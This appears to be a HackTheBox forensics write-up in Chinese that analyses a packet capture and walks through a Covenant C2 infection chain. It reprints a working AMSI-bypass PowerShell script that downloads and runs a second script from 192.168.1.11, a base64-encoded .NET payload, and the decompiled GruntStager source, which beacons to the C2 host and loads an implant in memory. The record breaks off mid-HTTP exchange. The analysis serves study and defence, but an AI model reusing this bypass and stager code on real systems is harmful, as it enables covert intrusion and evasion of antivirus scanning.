---
layout: post
title: "HackTheBox - Acknowledge the corn"
date: 2026-03-31
category: "Security Practice｜HackTheBox"
tags: []
draft: false
toc: true
comments: true
---

# HackTheBox - Acknowledge the corn
<!-- more -->

## 檢查pcap
Follow TCP Stream發現攻擊者request`192.168.1.11` GET `/byp.ps1`腳本，仔細分析會發現是個簡單的混淆過的powershell script，下面這一段在做的事情，主要就是hook/patch `AmsiScan(Antimalware Scan Interface)`的作用，讓後續的腳本可以安全落地，根據[^1]的說明，在Win10/Win Server 2016都預設安裝並啟用
```powershell
# 1. 定義 Win32 API
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );
}
"@

# 2. Add-Type 載入 C#（原本用 Add-Type 混淆）
Add-Type $Win32

# 3. 載入 amsi.dll
$loadLibrary = [Win32]::LoadLibrary("amsi.dll")

# 4. 找 AmsiScanBuffer
$address = [Win32]::GetProcAddress($loadLibrary, "AmsiScanBuffer")

# 5. 修改記憶體權限
$p = 0
[Win32]::VirtualProtect($address, 5, 0x40, [ref]$p)

# 6. patch AMSI
$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

# 7. 覆寫記憶體
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $address, 6)

# 8. 下載並執行 payload
iex (New-Object Net.WebClient).DownloadString("http://192.168.1.11/dwn.ps1")
```
為什麼要把`AmsiScanBuffer`做patch就可以bypass呢，[^1]寫的很深入，有興趣可以看一下，簡單來說`AmsiScanBuffer`就是執行所有powershell腳本時，使用到的command首先會被送達的地方進行檢查，所以bypass的方法有千百種
1. 透過base64之類的encoding bypass string detection
2. 透過memory patch的方式(也就是上述方式)
...

而以上的腳本可以參考[^2]，根本就是一模一樣，他就是
```asm
mov eax, 0x80070057;
ret;
```
的操作

## 解析第二個腳本
根據解完混淆的結果，他繼續下載`dwn.ps1`這個script，一樣為了安全落地而做obfuscator
```powershell
# 建立輸出 MemoryStream
$base64 = '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'
$o = New-Object IO.MemoryStream

# 建立 Deflate 解壓縮串流（從 Base64）
$compressedBytes = [Convert]::FromBase64String($base64)
$inputStream = New-Object IO.MemoryStream(,$compressedBytes)
$d = New-Object IO.Compression.DeflateStream(
    $inputStream,
    [IO.Compression.CompressionMode]::Decompress
)

# buffer
$b = New-Object Byte[] 1024

# 讀取資料
$r = $d.Read($b, 0, 1024)

while ($r -gt 0) {
    $o.Write($b, 0, $r)
    $r = $d.Read($b, 0, 1024)
}

# 載入 .NET assembly（fileless）
$assemblyBytes = $o.ToArray()
# dump 出來
[IO.File]::WriteAllBytes("payload.bin", $assemblyBytes)

Write-Host "[+] dumped payload.bin"
pause
# $assembly = [Reflection.Assembly]::Load($assemblyBytes)

# 執行 entry point
# $assembly.EntryPoint.Invoke($null, @(,[string[]]@())) | Out-Null
```

我們在實際執行之前，先pass並且把真正的malware腳本dump出來，有任何疑慮都應該在VM中執行，並且定期做snapshot。基本上那一大陀base64 string，就是實際的payload

## Dump出真正的malware
```bash
$ file payload.bin
payload.bin: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```
用dnSpy反編譯看靜態的內容，會發現class name是`GruntStager`，這個關鍵字第一次看到，但他其實是Covenant C2 的「第一階段 loader」，功能是：<span style="background-color: yellow">連上 C2 → 建立加密通道 → 下載真正的 implant（Grunt）</span>，而Covenant是什麼呢，根據[Covenant利用分析 ](https://3gstudent.github.io/Covenant%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)文章
> Covenant是.NET開發的C2(command and control)框架，使用.NET Core的開發環境，不僅支援Linux，MacOS和Windows，也支援docker容器。
> 
> 最特別的地方是支援動態編譯，能夠將輸入的C#程式碼上傳至C2 Server，取得編譯後的檔案並使用Assembly.Load()從記憶體進行載入。 

```csharp
public void ExecuteStager()
{
    try
    {
        List<string> list = "http://192.168.1.11:80".Split(new char[]{','}).ToList<string>(); // c2 server list
        string CovenantCertHash = "";
        List<string> list2 = (from H in "VXNlci1BZ2VudA==,Q29va2ll".Split(new char[]{','}).ToList<string>() // c2 package header key
        select Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList<string>();
        List<string> list3 = (from H in "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=".Split(new char[]{','}).ToList<string>() // c2 package header value
        select Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList<string>();
        List<string> list4 = (from U in "L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==".Split(new char[]{','}).ToList<string>() // c2 random directory
        select Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList<string>();
        string format = "i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73".Replace(Environment.NewLine, "\n");
        string format2 = "<html>\n    <head>\n        <title>Hello World!</title>\n    </head>\n    <body>\n        <p>Hello World!</p>\n        // Hello World! {0}\n    </body>\n</html>".Replace(Environment.NewLine, "\n");
        bool ValidateCert = bool.Parse("false");
        bool UseCertPinning = bool.Parse("false");
        Random random = new Random();
        string str = "69ebf9edc5";
        string text = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
        byte[] key = Convert.FromBase64String("e+MPqFZXA52Kx1xuTPTK6M/HtJkjq/0dfBJUsSJfzQw=");
        string format3 = "\{\{\"GUID\":\"{0}\",\"Type\":{1},\"Meta\":\"{2}\",\"IV\":\"{3}\",\"EncryptedMessage\":\"{4}\",\"HMAC\":\"{5}\"\}\}";
        Aes aes = Aes.Create();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = key;
        aes.GenerateIV();
        HMACSHA256 hmacsha = new HMACSHA256(key);
        RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(2048, new CspParameters());
        byte[] bytes = Encoding.UTF8.GetBytes(rsacryptoServiceProvider.ToXmlString(false));
        byte[] array = aes.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length);
        byte[] inArray = hmacsha.ComputeHash(array);
        string s = string.Format(format3, new object[]
        {
            str + text,
            "0",
            "",
            Convert.ToBase64String(aes.IV),
            Convert.ToBase64String(array),
            Convert.ToBase64String(inArray)
        });
        ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls);
        ServicePointManager.ServerCertificateValidationCallback = delegate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
        {
            bool flag = true;
            if (UseCertPinning && CovenantCertHash != "")
            {
                flag = (cert.GetCertHashString() == CovenantCertHash);
            }
            if (flag & ValidateCert)
            {
                flag = (errors == SslPolicyErrors.None);
            }
            return flag;
        };
        string arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s));
        GruntStager.CookieWebClient cookieWebClient = null;
        cookieWebClient = new GruntStager.CookieWebClient();
        cookieWebClient.UseDefaultCredentials = true;
        cookieWebClient.Proxy = WebRequest.DefaultWebProxy;
        cookieWebClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
        string text2 = "";
        foreach (string text3 in list)
        {
            try
            {
                for (int i = 0; i < list3.Count; i++)
                {
                    if (list2[i] == "Cookie")
                    {
                        cookieWebClient.SetCookies(new Uri(text3), list3[i].Replace(";", ",").Replace("{GUID}", ""));
                    }
                    else
                    {
                        cookieWebClient.Headers.Set(list2[i].Replace("{GUID}", ""), list3[i].Replace("{GUID}", ""));
                    }
                }
                cookieWebClient.DownloadString(text3 + list4[random.Next(list4.Count)].Replace("{GUID}", "")); // get method
                text2 = text3;
            }
            catch
            {
            }
        }
        for (int j = 0; j < list3.Count; j++)
        {
            if (list2[j] == "Cookie")
            {
                cookieWebClient.SetCookies(new Uri(text2), list3[j].Replace(";", ",").Replace("{GUID}", text));
            }
            else
            {
                cookieWebClient.Headers.Set(list2[j].Replace("{GUID}", text), list3[j].Replace("{GUID}", text));
            }
        }
        string text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0]; // post data
        text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
        List<string> list5 = GruntStager.Parse(text4, format3);
        string s2 = list5[3];
        string s3 = list5[4];
        string a = list5[5];
        byte[] array2 = Convert.FromBase64String(s3);
        if (!(a != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
        {
            aes.IV = Convert.FromBase64String(s2);
            byte[] rgb = aes.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length);
            byte[] key2 = rsacryptoServiceProvider.Decrypt(rgb, true);
            Aes aes2 = Aes.Create();
            aes2.Mode = CipherMode.CBC;
            aes2.Padding = PaddingMode.PKCS7;
            aes2.Key = key2;
            aes2.GenerateIV();
            hmacsha = new HMACSHA256(aes2.Key);
            byte[] array3 = new byte[4];
            RandomNumberGenerator.Create().GetBytes(array3);
            byte[] array4 = aes2.CreateEncryptor().TransformFinalBlock(array3, 0, array3.Length);
            inArray = hmacsha.ComputeHash(array4);
            string s4 = string.Format(format3, new object[]
            {
                text,
                "1",
                "",
                Convert.ToBase64String(aes2.IV),
                Convert.ToBase64String(array4),
                Convert.ToBase64String(inArray)
            });
            arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s4));
            for (int k = 0; k < list3.Count; k++)
            {
                if (list2[k] == "Cookie")
                {
                    cookieWebClient.SetCookies(new Uri(text2), list3[k].Replace(";", ",").Replace("{GUID}", text));
                }
                else
                {
                    cookieWebClient.Headers.Set(list2[k].Replace("{GUID}", text), list3[k].Replace("{GUID}", text));
                }
            }
            text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0];
            text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
            List<string> list6 = GruntStager.Parse(text4, format3);
            s2 = list6[3];
            s3 = list6[4];
            string a2 = list6[5];
            array2 = Convert.FromBase64String(s3);
            if (!(a2 != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
            {
                aes2.IV = Convert.FromBase64String(s2);
                byte[] src = aes2.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length);
                byte[] array5 = new byte[4];
                byte[] array6 = new byte[4];
                Buffer.BlockCopy(src, 0, array5, 0, 4);
                Buffer.BlockCopy(src, 4, array6, 0, 4);
                if (!(Convert.ToBase64String(array3) != Convert.ToBase64String(array5)))
                {
                    aes2.GenerateIV();
                    byte[] array7 = aes2.CreateEncryptor().TransformFinalBlock(array6, 0, array6.Length);
                    inArray = hmacsha.ComputeHash(array7);
                    string s5 = string.Format(format3, new object[]
                    {
                        text,
                        "2",
                        "",
                        Convert.ToBase64String(aes2.IV),
                        Convert.ToBase64String(array7),
                        Convert.ToBase64String(inArray)
                    });
                    arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s5));
                    for (int l = 0; l < list3.Count; l++)
                    {
                        if (list2[l] == "Cookie")
                        {
                            cookieWebClient.SetCookies(new Uri(text2), list3[l].Replace(";", ",").Replace("{GUID}", text));
                        }
                        else
                        {
                            cookieWebClient.Headers.Set(list2[l].Replace("{GUID}", text), list3[l].Replace("{GUID}", text));
                        }
                    }
                    text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0];
                    text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
                    List<string> list7 = GruntStager.Parse(text4, format3);
                    s2 = list7[3];
                    s3 = list7[4];
                    string a3 = list7[5];
                    array2 = Convert.FromBase64String(s3);
                    if (!(a3 != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
                    {
                        aes2.IV = Convert.FromBase64String(s2);
                        Assembly.Load(aes2.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length)).GetTypes()[0].GetMethods()[0].Invoke(null, new object[]
                        {
                            text2,
                            CovenantCertHash,
                            text,
                            aes2
                        });
                    }
                }
            }
        }
    }
    catch (Exception ex)
    {
        Console.Error.WriteLine(ex.Message + Environment.NewLine + ex.StackTrace);
    }
}
```
又又又是一個下在真正malware的script，到底煩不煩啊，我建議用pcap的流量搭配著看，會比較清楚
1. 跟`192.168.1.11:80`溝通之前要先構造封包的各種header
2. 之後會隨機選擇`/en-us/index.html`, `/en-us/docs.html`, `/en-us/test.html`這三個directory進行query，讓defender, EDR, IDS, IPS...覺得這是一個正常的流量
3. 建立AES的加密通道，從這一段可以知道AES的key是hardcoded
    ```csharp
    byte[] key = Convert.FromBase64String("e+MPqFZXA52Kx1xuTPTK6M/HtJkjq/0dfBJUsSJfzQw=");
    ...
    Aes aes = Aes.Create();
    aes.Mode = CipherMode.CBC;
    aes.Padding = PaddingMode.PKCS7;
    aes.Key = key;
    aes.GenerateIV();
    ```
4. 產生 RSA 公鑰 → 轉成字串 → 用 AES 加密後準備送給 C2
    ```csharp
    HMACSHA256 hmacsha = new HMACSHA256(key);
    RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(2048, new CspParameters());
    byte[] bytes = Encoding.UTF8.GetBytes(rsacryptoServiceProvider.ToXmlString(false));
    byte[] array = aes.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length);
    byte[] inArray = hmacsha.ComputeHash(array);
    ```
5. 遍歷可用的C2 Server，當初在看這一段的時候就覺得很奇怪，幹嘛多此一舉，原來的list可以是很多個不同c2 server list，這一段是在嘗試找到還活著的c2 server，也就是封包6的地方，當找到還活著的c2 server就
    ```csharp
    foreach (string text3 in list)
    {
        try
        {
            for (int i = 0; i < list3.Count; i++)
            {
                if (list2[i] == "Cookie")
                {
                    cookieWebClient.SetCookies(new Uri(text3), list3[i].Replace(";", ",").Replace("{GUID}", ""));
                }
                else
                {
                    cookieWebClient.Headers.Set(list2[i].Replace("{GUID}", ""), list3[i].Replace("{GUID}", ""));
                }
            }
            cookieWebClient.DownloadString(text3 + list4[random.Next(list4.Count)].Replace("{GUID}", ""));
            text2 = text3;
        }
        catch{}
    }
    ```
    ```http
    GET /en-us/test.html HTTP/1.1
    User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
    Host: 192.168.1.11
    Cookie: ASPSESSIONID=; SESSIONID=1552332971750
    ```
6. 首先進行一次正常的post handshake，也就是封包9~11的內容，也就是實際把RSA的public key用AES加密送出去(步驟4)
    ```csharp
    string text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0]; // post data
    ```
    ```http
    POST /en-us/test.html HTTP/1.1
    User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
    Host: 192.168.1.11
    Cookie: ASPSESSIONID=4f128f1882; SESSIONID=1552332971750
    Content-Length: 1036
    Expect: 100-continue
        
    HTTP/1.1 100 Continue

